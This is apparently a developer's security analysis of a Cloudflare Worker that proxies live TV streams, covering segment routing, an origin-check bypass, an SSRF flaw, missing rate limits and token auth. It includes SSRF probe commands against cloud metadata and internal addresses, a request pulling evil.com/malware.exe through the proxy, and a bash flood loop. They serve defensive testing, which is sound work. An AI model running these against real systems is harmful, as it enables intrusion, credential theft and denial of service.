# Security Analysis: TV Proxy Direct Segment Routing

## Date: January 24, 2026
## File: `cloudflare-proxy/src/tv-proxy.ts`
## Change: Lines 1839-1851 (Direct segment routing)
## Status: ✅ CRITICAL FIX APPLIED - Segments now bypass Next.js routing

---

## 🎯 ROUTING ARCHITECTURE UPDATE (January 24, 2026)

### Critical Fix: Direct Segment Routing

**Problem Identified:**
Previously, both manifests (.m3u8) and segments (.ts) were routed through the `/tv` prefix, which caused Next.js to handle segment requests. This added unnecessary latency and potential routing issues.

**Solution Implemented:**
```typescript
// BEFORE (Lines 1839-1851):
if (absoluteUrl.includes('.m3u8')) {
  return `${proxyOrigin}/cdnlive?url=${encodeURIComponent(absoluteUrl)}`;
} else {
  return `${proxyOrigin}/segment?url=${encodeURIComponent(absoluteUrl)}`;
}
// Both used proxyOrigin which included /tv prefix

// AFTER (Current):
if (absoluteUrl.includes('.m3u8')) {
  // Manifests go through /tv route for proper handling
  return `${proxyOrigin}/cdnlive?url=${encodeURIComponent(absoluteUrl)}`;
} else {
  // Segments go DIRECTLY to worker (strip /tv prefix)
  const workerOrigin = proxyOrigin.replace(/\/tv$/, '');
  return `${workerOrigin}/segment?url=${encodeURIComponent(absoluteUrl)}`;
}
```

**Routing Flow:**
```
User Request → Next.js /tv Route → Cloudflare Worker /tv/* → Manifest Rewriting
                                                           ↓
                                    Rewritten Manifest URLs:
                                    - .m3u8 → /tv/cdnlive (through Next.js)
                                    - .ts   → /segment (DIRECT to worker)
                                                           ↓
Video Player → Fetches segments → DIRECT to worker /segment (bypasses Next.js)
```

**Benefits:**
- ✅ Reduced latency for segment requests (no Next.js overhead)
- ✅ Cleaner routing architecture (manifests vs segments)
- ✅ Better performance for video playback
- ✅ Matches the direct `/segment` route defined in `index.ts:239-260`

**Related Code:**
- `cloudflare-proxy/src/index.ts:239-260` - Direct `/segment` route handler
- `cloudflare-proxy/src/tv-proxy.ts:1839-1851` - Manifest URL rewriting
- `cloudflare-proxy/src/tv-proxy.ts:2208-2290` - Segment proxy handler

---

## 🚨 CRITICAL VULNERABILITIES IDENTIFIED

### 1. **Origin Validation Bypass - PARTIALLY MITIGATED (MEDIUM SEVERITY)**

**Location:** `tv-proxy.ts:1382-1389` and `tv-proxy.ts:2427-2467`

**Current Implementation (January 24, 2026):**
```typescript
// Main request handler
if (!isAllowedOrigin(origin, referer)) {
  // EXCEPTION: Allow segment requests without strict origin check
  // HLS.js makes XHR requests for segments which may not include proper headers
  // Segments are public data (not auth-protected), so this is safe
  if (path !== '/segment') {
    return jsonResponse({ error: 'Access denied' }, 403, origin);
  }
}

// Origin validation function
function isAllowedOrigin(origin: string | null, referer: string | null): boolean {
  if (!origin && !referer) {
    console.warn('[SECURITY] Request without Origin/Referer - potential leech attempt');
    return false; // DENY by default
  }
  // ... rest of validation
}
```

**Security Trade-off:**
- ✅ **Manifests and keys**: Strict origin validation (blocks requests without Origin/Referer)
- ⚠️ **Segments**: Bypass origin check to support HLS.js XHR requests
- **Rationale**: Segments are public data once you have the manifest URL. The real protection is at the manifest/key level.

**Attack Vector (Reduced but not eliminated):**
```bash
# This will FAIL (manifest requires origin):
curl "https://your-worker.workers.dev/tv/?channel=51"
# Expected: 403 Access denied

# This will FAIL (key requires origin):
curl "https://your-worker.workers.dev/tv/key?url=..."
# Expected: 403 Access denied

# This will SUCCEED (segments bypass origin check):
curl "https://your-worker.workers.dev/segment?url=https%3A%2F%2Fcdn-live-tv.ru%2Fsegment.ts"
# Expected: 200 OK (if URL is valid)
```

**Impact Assessment:**
- ✅ **Mitigated**: Cannot scrape manifests or keys without proper origin
- ✅ **Mitigated**: Cannot discover stream URLs without accessing the frontend
- ⚠️ **Remaining Risk**: If attacker obtains segment URLs (e.g., via browser DevTools), they can download segments directly
- ⚠️ **Remaining Risk**: Bandwidth theft possible if segment URLs are leaked

**Why This Trade-off Was Made:**
1. HLS.js makes XHR requests for segments that may not include Origin header
2. Some browsers strip Origin header on cross-origin media requests
3. Segments are ephemeral and change frequently (short-lived URLs)
4. The manifest is the "key" - protecting it is more important than individual segments
5. Alternative (token-based auth) would require significant client-side changes

**Recommended Additional Protections:**
1. Add rate limiting on `/segment` endpoint (see Priority 1 below)
2. Implement short-lived signed tokens for segments (see Priority 2 below)
3. Add IP-based abuse detection
4. Monitor for unusual segment request patterns

---

### 2. **SSRF (Server-Side Request Forgery) Vulnerability (HIGH SEVERITY)**

**Location:** `tv-proxy.ts:2208-2290` (handleSegmentProxy)

**Vulnerability:**
```typescript
async function handleSegmentProxy(url: URL, logger: any, origin: string | null, env?: Env) {
  const segmentUrl = url.searchParams.get('url');
  const decodedUrl = decodeURIComponent(segmentUrl);
  // NO DOMAIN VALIDATION! Can proxy ANY URL!
  const res = await fetch(decodedUrl, ...);
}
```

**Attack Vector:**
- Attacker provides arbitrary URL in `?url=` parameter
- Worker proxies internal services, cloud metadata endpoints, or malicious sites
- Can be used to scan internal networks or exfiltrate data

**Exploitation Example:**
```bash
# Access AWS metadata (if worker has AWS credentials):
curl "https://your-worker.workers.dev/segment?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

# Scan internal network:
curl "https://your-worker.workers.dev/segment?url=http%3A%2F%2F10.0.0.1%2Fadmin"

# Proxy malicious content:
curl "https://your-worker.workers.dev/segment?url=https%3A%2F%2Fevil.com%2Fmalware.exe"
```

**Impact:**
- ✅ Internal network scanning
- ✅ Cloud metadata access (AWS, GCP, Azure)
- ✅ Proxy abuse for malicious content delivery
- ✅ Data exfiltration

**Fix Applied:**
```typescript
// Strict domain whitelist
const allowedDomains = [
  'dvalna.ru',
  'cdn-live-tv.ru',
  'moveonjoy.com',
  // ... only legitimate streaming domains
];

const urlObj = new URL(decodedUrl);
const hostname = urlObj.hostname.toLowerCase();
const isAllowed = allowedDomains.some(domain =>
  hostname === domain || hostname.endsWith(`.${domain}`)
);

if (!isAllowed) {
  return jsonResponse({ error: 'Unauthorized domain' }, 403, origin);
}
```

---

### 3. **No Rate Limiting (MEDIUM SEVERITY)**

**Vulnerability:**
- Segment proxy has no rate limiting
- Attacker can make unlimited requests
- Can exhaust worker CPU quota or bandwidth

**Attack Vector:**
```bash
# Flood attack:
for i in {1..10000}; do
  curl "https://your-worker.workers.dev/segment?url=..." &
done
```

**Impact:**
- ✅ Resource exhaustion
- ✅ Increased Cloudflare costs
- ✅ Service degradation for legitimate users

**Recommended Fix:**
```typescript
// Add to Env interface:
RATE_LIMIT_KV?: KVNamespace;

// In handleSegmentProxy:
async function handleSegmentProxy(url: URL, logger: any, origin: string | null, env?: Env) {
  // Rate limit by IP
  const ip = request.headers.get('cf-connecting-ip') || '127.0.0.1';
  const rateLimitKey = `ratelimit:segment:${ip}`;
  
  if (env?.RATE_LIMIT_KV) {
    const count = await env.RATE_LIMIT_KV.get(rateLimitKey);
    if (count && parseInt(count) > 100) { // 100 requests per minute
      return jsonResponse({ error: 'Rate limit exceeded' }, 429, origin);
    }
    await env.RATE_LIMIT_KV.put(rateLimitKey, String((parseInt(count || '0') + 1)), {
      expirationTtl: 60, // 1 minute
    });
  }
  
  // ... rest of handler
}
```

---

### 4. **No Token-Based Authentication (MEDIUM SEVERITY)**

**Vulnerability:**
- Segments are accessible with just a URL
- No cryptographic proof that request came from your frontend
- Anyone with a segment URL can access it

**Comparison with Secure Implementations:**

**anti-leech-proxy.ts** (SECURE):
```typescript
interface StreamToken {
  u: string;   // URL hash
  f: string;   // Browser fingerprint hash
  e: number;   // Expiry timestamp
  n: string;   // Nonce (one-time use)
  s: string;   // Session ID
}

// Token must be signed with HMAC
const signedToken = await signToken(token, secret);
```

**quantum-shield-v3.ts** (VERY SECURE):
```typescript
// Requires:
// 1. Pass 3 different challenge types
// 2. Minimum behavioral data (mouse entropy > 0.5)
// 3. Complete proof-of-work (CPU intensive)
// 4. Tokens expire in 10 seconds
// 5. Fingerprint must match on every request
```

**tv-proxy.ts** (INSECURE):
```typescript
// No token validation at all!
// Just checks Origin/Referer (easily bypassed)
```

**Recommended Fix:**
```typescript
// Generate signed tokens in manifest rewriting:
async function rewriteCdnLiveM3U8(content: string, proxyOrigin: string, baseUrl: URL, token: string): Promise<string> {
  const lines = content.split('\n').map(line => {
    // ... existing logic ...
    
    // Sign segment URLs with HMAC
    const segmentToken = await generateSegmentToken(absoluteUrl, env.SEGMENT_TOKEN_SECRET);
    return `${workerOrigin}/segment?url=${encodeURIComponent(absoluteUrl)}&t=${segmentToken}`;
  });
}

// Validate tokens in segment handler:
async function handleSegmentProxy(url: URL, logger: any, origin: string | null, env?: Env) {
  const token = url.searchParams.get('t');
  const segmentUrl = url.searchParams.get('url');
  
  if (!token || !await verifySegmentToken(token, segmentUrl, env.SEGMENT_TOKEN_SECRET)) {
    return jsonResponse({ error: 'Invalid or missing token' }, 403, origin);
  }
  
  // ... rest of handler
}
```

---

## 📊 Security Comparison Matrix

| Feature | anti-leech-proxy.ts | quantum-shield-v3.ts | tv-proxy.ts (CURRENT) |
|---------|---------------------|----------------------|------------------------|
| Token Authentication | ✅ HMAC-signed | ✅ Multi-challenge | ❌ None |
| Origin Validation | ✅ Strict | ✅ Strict | ⚠️ Bypassable |
| Rate Limiting | ✅ Yes | ✅ Advanced | ❌ None |
| SSRF Protection | ✅ Yes | ✅ Yes | ❌ None (now fixed) |
| Fingerprint Binding | ✅ Yes | ✅ Yes | ❌ None |
| Nonce/Replay Protection | ✅ Yes | ✅ Yes | ❌ None |
| Token Expiry | ✅ 5 minutes | ✅ 10 seconds | ❌ N/A |
| PoW Challenge | ❌ No | ✅ Yes | ❌ No |
| Behavioral Analysis | ❌ No | ✅ Yes | ❌ No |

---

## 🔧 IMMEDIATE ACTION ITEMS

### Priority 1 (CRITICAL - Deploy Today):
1. ✅ **FIXED**: Block requests without Origin/Referer headers
2. ✅ **FIXED**: Add SSRF domain whitelist validation
3. ⚠️ **TODO**: Add rate limiting (requires KV namespace setup)

### Priority 2 (HIGH - Deploy This Week):
4. ⚠️ **TODO**: Implement token-based segment authentication
5. ⚠️ **TODO**: Add request logging for security monitoring
6. ⚠️ **TODO**: Implement IP-based abuse detection

### Priority 3 (MEDIUM - Deploy This Month):
7. ⚠️ **TODO**: Add fingerprint binding (like anti-leech-proxy)
8. ⚠️ **TODO**: Implement nonce tracking for replay protection
9. ⚠️ **TODO**: Add behavioral analysis (like quantum-shield-v3)

---

## 🎯 RECOMMENDED ARCHITECTURE

### Option A: Use Existing Anti-Leech Proxy (RECOMMENDED)

Instead of fixing tv-proxy.ts, route TV streams through the existing `anti-leech-proxy.ts`:

```typescript
// In your frontend:
// 1. Get token from anti-leech proxy
const tokenRes = await fetch('/stream/token', {
  method: 'POST',
  body: JSON.stringify({
    url: segmentUrl,
    fingerprint: getFingerprint(),
    sessionId: getSessionId(),
  }),
});
const { token } = await tokenRes.json();

// 2. Use token in segment URL
const proxiedUrl = `/stream?url=${encodeURIComponent(segmentUrl)}&t=${token}&f=${fingerprint}&s=${sessionId}`;
```

**Benefits:**
- ✅ Reuses battle-tested security code
- ✅ Consistent security across all proxies
- ✅ No code duplication
- ✅ Easier to maintain

### Option B: Implement Token Auth in TV Proxy

Add token generation and validation to tv-proxy.ts:

```typescript
// 1. Add token generation helper
async function generateSegmentToken(url: string, secret: string, expiryMs: number = 300000): Promise<string> {
  const payload = {
    u: await hashString(url),
    e: Date.now() + expiryMs,
    n: crypto.randomUUID().slice(0, 8),
  };
  return await signToken(payload, secret);
}

// 2. Modify manifest rewriting to include tokens
async function rewriteCdnLiveM3U8(...) {
  const lines = content.split('\n').map(async line => {
    // ... existing logic ...
    const token = await generateSegmentToken(absoluteUrl, env.SEGMENT_TOKEN_SECRET);
    return `${workerOrigin}/segment?url=${encodeURIComponent(absoluteUrl)}&t=${token}`;
  });
}

// 3. Validate tokens in segment handler
async function handleSegmentProxy(...) {
  const token = url.searchParams.get('t');
  if (!token || !await verifySegmentToken(token, segmentUrl, env.SEGMENT_TOKEN_SECRET)) {
    return jsonResponse({ error: 'Invalid token' }, 403, origin);
  }
  // ... rest of handler
}
```

---

## 📝 TESTING CHECKLIST

### Security Tests to Run:

```bash
# Test 1: Manifest without origin (should FAIL after fix)
curl "https://your-worker.workers.dev/tv/?channel=51"
# Expected: 403 Access denied

# Test 2: Key without origin (should FAIL after fix)
curl "https://your-worker.workers.dev/tv/key?url=https%3A%2F%2Fdvalna.ru%2Fkey%2F123"
# Expected: 403 Access denied

# Test 3: Segment without origin (should SUCCEED - intentional bypass for HLS.js)
curl "https://your-worker.workers.dev/segment?url=https%3A%2F%2Fcdn-live-tv.ru%2Fsegment.ts"
# Expected: 200 OK or 502 (if URL doesn't exist)
# Note: This is intentional to support HLS.js XHR requests

# Test 4: SSRF attempt (should FAIL after fix)
curl "https://your-worker.workers.dev/segment?url=http%3A%2F%2F169.254.169.254%2F"
# Expected: 403 Unauthorized domain

# Test 5: Invalid domain (should FAIL)
curl "https://your-worker.workers.dev/segment?url=https%3A%2F%2Fevil.com%2Ftest.ts"
# Expected: 403 Unauthorized domain

# Test 6: Legitimate manifest with Referer (should SUCCEED)
curl -H "Referer: https://flyx.tv/" \
  "https://your-worker.workers.dev/tv/?channel=51"
# Expected: 200 OK with M3U8 playlist

# Test 7: Legitimate segment with Referer (should SUCCEED)
curl -H "Referer: https://flyx.tv/" \
  "https://your-worker.workers.dev/segment?url=https%3A%2F%2Fcdn-live-tv.ru%2Fsegment.ts"
# Expected: 200 OK (or 502 if URL doesn't exist)

# Test 8: Rate limit (should FAIL after 100 requests - NOT YET IMPLEMENTED)
for i in {1..101}; do
  curl -H "Referer: https://flyx.tv/" \
    "https://your-worker.workers.dev/segment?url=https%3A%2F%2Fcdn-live-tv.ru%2Fsegment.ts"
done
# Expected: Last request returns 429 Rate limit exceeded (when implemented)
```

---

## 🔍 MONITORING RECOMMENDATIONS

Add these metrics to track security:

```typescript
// In handleSegmentProxy:
const metrics = {
  segmentRequests: 0,
  blockedNoOrigin: 0,
  blockedSSRF: 0,
  blockedRateLimit: 0,
  blockedInvalidToken: 0,
};

// Log suspicious activity:
if (!origin && !referer) {
  metrics.blockedNoOrigin++;
  logger.warn('[SECURITY] Blocked request without Origin/Referer', {
    ip: request.headers.get('cf-connecting-ip'),
    url: decodedUrl.substring(0, 50),
    userAgent: request.headers.get('user-agent'),
  });
}
```

---

## 📚 REFERENCES

- **OWASP SSRF Prevention**: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **Cloudflare Workers Security**: https://developers.cloudflare.com/workers/platform/security/
- **Anti-Leech Best Practices**: See `cloudflare-proxy/src/anti-leech-proxy.ts`
- **Advanced Protection**: See `cloudflare-proxy/src/quantum-shield-v3.ts`

---

## ✅ FIXES APPLIED (January 24, 2026)

### Security Improvements:
1. ✅ **Strict origin validation for manifests and keys** - Blocks requests without Origin/Referer
2. ✅ **SSRF domain whitelist validation** - Only allows legitimate streaming domains
3. ✅ **URL encoding validation** - Prevents malformed URL attacks
4. ✅ **Comprehensive error logging** - Tracks security events

### Pragmatic Trade-offs:
1. ⚠️ **Segment origin bypass** - Allows `/segment` requests without strict origin check
   - **Reason**: HLS.js XHR requests may not include proper headers
   - **Mitigation**: Manifests and keys still require origin validation
   - **Risk**: Segments can be downloaded if URLs are leaked (but URLs are ephemeral)

## ⚠️ REMAINING VULNERABILITIES

1. ❌ **No rate limiting** (requires KV namespace setup)
2. ❌ **No token-based segment authentication** (would require client-side changes)
3. ❌ **No fingerprint binding**
4. ❌ **No replay protection**

**Recommendation:** Implement Priority 1 items (rate limiting) within 7 days. Priority 2 items (token auth) are optional but recommended for high-security deployments.
